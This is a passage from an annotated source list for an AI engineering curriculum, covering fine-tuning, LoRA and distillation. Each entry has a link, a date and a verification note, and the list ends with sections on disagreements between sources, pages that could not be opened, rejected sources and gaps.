1. **Model optimization (OpenAI API docs)** plus the **Deprecations page** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/model-optimization and https://developers.openai.com/api/docs/deprecations
   kind: docs · primary: yes
   Why: The official "evals first, prompt first" loop and the cases where fine-tuning pays off (more examples than fit in context, shorter prompts, a smaller model). Also the wind-down: 2026-05-07 closed to new organizations, 2026-07-02 closed to organizations inactive for 60 days, 2027-01-06 no new jobs for anyone. Inference on existing fine-tuned models continues until their base models are deprecated.
   Checked: Current. The deprecations page gives no reason for the wind-down. A secondary article says the reason is that base models are strong enough for prompt plus RAG. I did not find that in an OpenAI source, so don't cite it.
2. **Fine-Tuning or Retrieval? Comparing Knowledge Injection in LLMs** by Ovadia, Brief, Mishaeli, Elisha (Microsoft), 2023-12 (rev. 2024-01)
   https://arxiv.org/abs/2312.05934
   kind: paper · primary: yes
   Why: The RAG-vs-fine-tuning result: "RAG consistently outperforms it", and LLMs struggle to learn new facts through unsupervised fine-tuning.
   Checked: Abstract confirmed. It uses older models, but the finding holds up in later work and in the Anyscale posts.
3. **Fine-Tuning Llama-2: A Comprehensive Case Study for Tailoring Models to Unique Applications** by Hakhamaneshi, Ahmad (Anyscale), 2023-08-11
   https://www.anyscale.com/blog/fine-tuning-llama-2-a-comprehensive-case-study-for-tailoring-models-to-unique-applications
   kind: blog · primary: yes
   Why: The "fine-tuning is for form, not facts" rule with numbers. ViGGO went from 58% to 98% and SQL beat GPT-4, but GSM8k math only went from 28% to 47%, still behind GPT-4.
   Checked: Confirmed. The models are old, but it still gives the clearest split between tasks fine-tuning helps and tasks it doesn't.
4. **LoRA Land: 310 Fine-tuned LLMs that Rival GPT-4** by Zhao et al. (Predibase), 2024-04-29
   https://arxiv.org/abs/2405.00732
   kind: paper · primary: yes
   Why: Scale evidence. 4-bit LoRA fine-tunes beat their base models by 34 points and GPT-4 by 10 on average across 31 narrow tasks, and 25 adapters are served on one A100.
   Checked: Abstract confirmed. GPT-4 is the old baseline.
5. **SFT Trainer (TRL docs)** by Hugging Face, TRL v1.13.0, checked 2026-09-23
   https://huggingface.co/docs/trl/sft_trainer
   kind: docs · primary: yes
   Why: The path you'll actually use now that OpenAI is closing. It covers the loss (next-token cross-entropy), prompt-completion data format, loss on completions only, and LoRA/QLoRA through `peft_config`, with a Qwen3-0.6B example.
   Checked: Current version.
6. **Building an LLM Router for High-Quality and Cost-Effective Responses** by Almahairi (Anyscale, with LMSYS), 2024-07-01
   https://www.anyscale.com/blog/building-an-llm-router-for-high-quality-and-cost-effective-responses
   kind: blog · primary: yes
   Why: Almost exactly your build. They fine-tuned Llama 3-8B as a query classifier with LLM-as-judge labels and got up to 70% cost cut on MT Bench.
   Checked: Confirmed. The paper behind it is **RouteLLM** (https://arxiv.org/abs/2406.18665, 2024-06-26, v4 2025-02-23, primary), where routers trained on preference data cut cost ">2 times" and still worked when the model pair was swapped.
Also serves: rag, few-shot-prompting, distillation (#6 uses GPT-4 as judge/teacher), evals nodes (#1), model-routing if that node exists

### lora (short)
1. **LoRA: Low-Rank Adaptation of Large Language Models** by Hu et al. (Microsoft), 2021-06-17 (rev. 2021-10-16)
   https://arxiv.org/abs/2106.09685
   kind: paper · primary: yes
   Why: The mechanism: frozen weights plus trainable low-rank matrices. 10,000× fewer trainable parameters, 3× less GPU memory, and no added inference latency once merged.
   Checked: Abstract confirmed.
2. **LoRA Without Regret** by John Schulman and Thinking Machines Lab, 2025-09-29
   https://thinkingmachines.ai/blog/lora/
   kind: blog · primary: yes
   Why: The current practical answer. LoRA matches full fine-tuning on post-training-sized datasets if applied to all layers (MLP too) at about 10× the full-FT learning rate. It fails when the data exceeds its capacity.
   Checked: Confirmed. It cites and reconciles Biderman et al.
Extras if needed: **QLoRA** (https://arxiv.org/abs/2305.14314, 2023-05-23, primary): NF4 plus double quantization, and a 65B model on one 48 GB GPU. **LoRA Learns Less and Forgets Less** (https://arxiv.org/abs/2405.09673, TMLR 2024, primary): underperforms on code and math, forgets less. **PEFT LoRA guide** (https://huggingface.co/docs/peft/main/en/conceptual_guides/lora, primary for the library): r, alpha, target modules, merging.
Also serves: fine-tuning, quantization (QLoRA)

### distillation (short)
1. **Distilling the Knowledge in a Neural Network** by Hinton, Vinyals, Dean, 2015-03-09
   https://arxiv.org/abs/1503.02531
   kind: paper · primary: yes
   Why: The original idea: train a small student on a teacher's "soft targets".
   Checked: Abstract confirmed. Classic, and still the reference.
2. **DeepSeek-R1**, section 4.1 "Distillation v.s. Reinforcement Learning", by DeepSeek-AI, 2025-01-22, v2 2026-01-04, Nature 645 (2025)
   https://arxiv.org/abs/2501.12948 (section read at https://arxiv.org/html/2501.12948v1)
   kind: paper · primary: yes
   Why: The modern LLM version: SFT on about 800k teacher outputs. "distilling more powerful models into smaller ones yields excellent results" beats running RL directly on the small model.
   Checked: Section and numbers confirmed in the v1 HTML.
Extras: **Distilling Step-by-Step** (https://arxiv.org/abs/2305.02301, Findings of ACL 2023, primary): a 770M T5 beats 540B PaLM using teacher rationales. The **OpenAI SFT guide**, section "Distilling from a larger model" (https://developers.openai.com/api/docs/guides/supervised-fine-tuning), is the API recipe, but it is under the wind-down notice.
Also serves: fine-tuning

### Disagreements and tensions
- **Fine-tuning vs RAG vs prompting.** Ovadia et al. find RAG beats fine-tuning for adding facts. Anyscale finds fine-tuning beats GPT-4 on format and structure tasks but not math. LoRA Land says small fine-tunes beat GPT-4 on narrow tasks. OpenAI tells you to prompt first and is now closing its fine-tuning platform. The pattern across them: fine-tuning is for form and narrow classification (like routing), not for facts.
- **How much 4-bit quantization costs.** Kurtic et al. say INT4 weight-only comes close to 8-bit on Llama-3.1. Huang et al. report "non-negligible degradation" for LLaMA3, especially below 4 bits. The gap is mostly about the method (GPTQ/AWQ vs plain rounding) and the bit width, so name both when you cite.
- **LoRA vs full fine-tuning.** Biderman et al. and Anyscale (2023) found LoRA clearly worse on math and code. Thinking Machines (2025) finds parity when LoRA is applied to all layers with a higher learning rate, and agrees LoRA falls short only when the dataset is pretraining-sized.
- **Document parsing rankings.** Marker's README says Marker beats Docling and MinerU on olmOCR-bench. OmniDocBench puts Marker last among the tools it lists (78.44). Mistral says OCR 4 ranks first on OmniDocBench (93.07), but the OmniDocBench v1.7 leaderboard's top score is 96.91 (TeleOCR). Both benchmarks and several vendors warn about ground-truth errors. Conclusion: build your own small eval on your own PDFs.
- **How PDFs reach the model.** Anthropic and OpenAI send extracted text plus a page image. Gemini charges a flat 258 tokens per page for vision, and its native text is free on Gemini 3. Cost per page differs a lot.
- **Image tokenization.** Claude uses 28-px patches, newer OpenAI models use 32-px patches with multipliers, and older OpenAI models use 512-px tiles. "Images become tokens" is true everywhere, but the counts don't transfer across providers.

### Couldn't open
- https://openai.com/index/api-model-distillation/ returned HTTP 403. The docs version (#extras under distillation) covers the recipe.
- https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models/tune-models and .../gemini-supervised-tuning loaded, but only navigation came through, not the guidance. I can't say what they claim. The pages mention Gemini 3.x tuning, SFT, preference tuning and RL tuning.
- https://www.aihero.dev/ai-engineer-roadmap opened, but the visible content has no Phase 7 topics (vision, speech, local models, fine-tuning), and it shows no author or date. It isn't useful for this phase.

### Rejected
- **Mistral OCR (2025-03-06)**, https://mistral.ai/news/mistral-ocr: carries its own "no longer maintained" notice and used internal benchmarks. Replaced by OCR 4.
- **AWS: Best practices for fine-tuning Claude 3 Haiku on Bedrock (2024-11-01)**: I opened it. It has real numbers (TAT-QA F1 went from 73.2 to 91.2), but it is about an older model generation that is only on Bedrock, and it is AWS's own evaluation. Keep it as a backup only.
- **Anyscale "LoRA or Full-Parameter" (2023-09-06)**: I opened it. It is superseded by Thinking Machines (2025) on the main question. It is still usable as a data point for the disagreement.
- **Gemini 1.5 report (2403.05530)**: I opened it. It is about long context, not vision mechanism, and the model generation is old.
- Third-party explainers (DataCamp, Medium, lablab, callsphere, tessl, startupfortune): they are not primary, and primary sources exist. The tessl and startupfortune pieces give a reason for OpenAI's wind-down that I couldn't find in any OpenAI document.

### Gaps
- **text-to-speech:** no paper on how modern TTS works, only provider docs about latency. That's enough for a `short` node about latency. If you want the mechanism, the next thing to search for is a neural codec / audio-token TTS paper.
- **fine-tuning with a provider API:** OpenAI is closing, Anthropic offers fine-tuning only on Bedrock (Claude 3 Haiku), and I couldn't read the Google Vertex pages. The build should use open models (TRL + PEFT). Consider a decision record for this.
- **vision-models:** nothing primary from Anthropic, OpenAI or Google on how their production vision encoders are built (only the token-cost side). The patch explanation relies on ViT, CLIP and LLaVA plus the API docs.
- **local-models:** no neutral source compares Ollama, LM Studio and vLLM. The memory-bandwidth claim rests on community benchmark data (#6) plus llama.cpp's own table. That's fine to cite if you label it as measurements, not a spec.

